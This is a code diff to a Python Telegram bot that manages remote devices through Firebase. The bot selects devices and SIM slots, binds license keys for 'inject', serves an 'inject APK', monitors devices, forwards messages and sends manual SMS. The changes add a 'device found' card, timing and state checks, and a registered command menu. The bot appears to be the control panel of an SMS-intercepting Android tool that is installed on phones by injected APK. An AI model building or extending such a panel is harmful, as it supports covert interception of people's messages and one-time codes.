@@ -27,6 +27,7 @@ from app.device_ui import (
     format_access_approved_card,
     format_addchannel_card,
     format_apk_download_card,
+    format_device_found_card,
     format_device_set_card,
     format_firebase_connected_card,
     format_key_error_card,
@@ -618,7 +619,7 @@ async def device_select_command(
     bind_license_key: bool = False,
     require_key: bool = False,
 ) -> None:
-    """Find device — /fdy /fy /fb without key; /a with license key for inject."""
+    """Find device — /fdy without key; /a with license key for inject."""
     user = update.effective_user
     if not await reply_if_unauthorized(update):
         return
@@ -644,12 +645,21 @@ async def device_select_command(
         await update.message.reply_text("❌ <code>/fdy &lt;device_id&gt;</code>", parse_mode="HTML")
         return
 
+    import time
+
     status_msg = await update.message.reply_text(
         f"🔍 Device <code>{deviceid}</code> dhundh raha hoon...",
         parse_mode="HTML",
     )
     db: Session = SessionLocal()
+    t0 = time.perf_counter()
+    was_monitoring = False
+    old_device_id = None
     try:
+        existing = get_monitor_profile(db, user.id)
+        if existing:
+            was_monitoring = bool(existing.is_monitoring)
+            old_device_id = existing.active_device_id
         device, profile = await asyncio.wait_for(
             show_device_by_id(
                 db,
@@ -658,6 +668,10 @@ async def device_select_command(
                 bind_license_key=bind_license_key,
             ),
             timeout=25.0,
+        )
+        found_ms = max(1, int((time.perf_counter() - t0) * 1000))
+        monitoring_stopped = was_monitoring and (
+            old_device_id != device.id or not profile.is_monitoring
         )
     except asyncio.TimeoutError:
         from app.services import get_all_firebase_urls
@@ -703,7 +717,14 @@ async def device_select_command(
     except Exception:
         pass
     try:
-        await send_device_set_ui(update.message, device, profile)
+        await send_device_set_ui(
+            update.message,
+            device,
+            profile,
+            card="found" if bind_license_key is False else "set",
+            found_ms=found_ms if bind_license_key is False else None,
+            monitoring_was_stopped=monitoring_stopped if bind_license_key is False else False,
+        )
     except Exception as exc:
         logger.error("Device card send failed: %s", exc)
         await update.message.reply_text(
@@ -737,13 +758,18 @@ async def setdevice_command(update: Update, context: ContextTypes.DEFAULT_TYPE) 
 
 
 async def fy_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    await device_select_command(update, context, bind_license_key=False)
+    """Legacy alias — use /a (KEY required for inject device)."""
+    await a_command(update, context)
 
 
 async def send_device_set_ui(
     message,
     device: Device,
     profile: MonitorProfile | None = None,
+    *,
+    card: str = "set",
+    found_ms: int | None = None,
+    monitoring_was_stopped: bool = False,
 ) -> None:
     if device.firebase_source_url:
         db: Session = SessionLocal()
@@ -760,15 +786,22 @@ async def send_device_set_ui(
             db.close()
 
     sim_index = profile.selected_sim_index if profile else 0
-    await message.reply_text(
-        format_device_set_card(
+    if card == "found":
+        text = format_device_found_card(
+            device,
+            profile,
+            found_ms=found_ms,
+            monitoring_was_stopped=monitoring_was_stopped,
+        )
+        keyboard = device_set_keyboard(device, compact=True)
+    else:
+        text = format_device_set_card(
             device,
             selected_sim=sim_index,
             status=device_status(device),
-        ),
-        parse_mode="HTML",
-        reply_markup=device_set_keyboard(device),
-    )
+        )
+        keyboard = device_set_keyboard(device)
+    await message.reply_text(text, parse_mode="HTML", reply_markup=keyboard)
 
 
 async def a_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -1381,11 +1414,10 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             profile = select_sim_slot(db, user.id, int(sim_index))
             db.commit()
             asyncio.create_task(sync_profile_for_user(user.id))
-            active = get_selected_sim(device, int(sim_index))
             await query.edit_message_text(
-                format_sim_selected_card(device, profile.selected_sim_index or 0),
+                format_device_set_card(device, profile.selected_sim_index or 0),
                 parse_mode="HTML",
-                reply_markup=sim_monitoring_keyboard(device),
+                reply_markup=device_set_keyboard(device),
             )
             return
 
@@ -1452,6 +1484,31 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
         db.close()
 
 
+async def _post_init_set_commands(app: Application) -> None:
+    from telegram import BotCommand
+
+    commands = [
+        BotCommand("start", "Welcome & setup guide"),
+        BotCommand("help", "All commands (Astik menu)"),
+        BotCommand("guide", "Setup + channel auto-token help"),
+        BotCommand("setfirebase", "Connect your Firebase DB"),
+        BotCommand("setdevice", "Pick device & select SIM"),
+        BotCommand("fdy", "Find device & select SIM (admin)"),
+        BotCommand("a", "Pick device with KEY (inject)"),
+        BotCommand("mynum", "Your forwarding number"),
+        BotCommand("key", "License key for inject"),
+        BotCommand("addchannel", "Link Telegram channel"),
+        BotCommand("startmonitor", "Start monitoring"),
+        BotCommand("stop", "Pause monitoring"),
+        BotCommand("resume", "Resume monitoring"),
+        BotCommand("status", "Current stats"),
+        BotCommand("send", "Manual SMS"),
+        BotCommand("ping", "Check latency"),
+        BotCommand("apk", "Download inject APK"),
+    ]
+    await app.bot.set_my_commands(commands)
+
+
 def build_telegram_app() -> Application | None:
     if not settings.telegram_bot_token:
         logger.warning("TELEGRAM_BOT_TOKEN not set; Telegram bot disabled")
@@ -1461,6 +1518,7 @@ def build_telegram_app() -> Application | None:
         Application.builder()
         .token(settings.telegram_bot_token)
         .concurrent_updates(True)
+        .post_init(_post_init_set_commands)
         .build()
     )
     app.add_handler(CommandHandler("start", start_command))
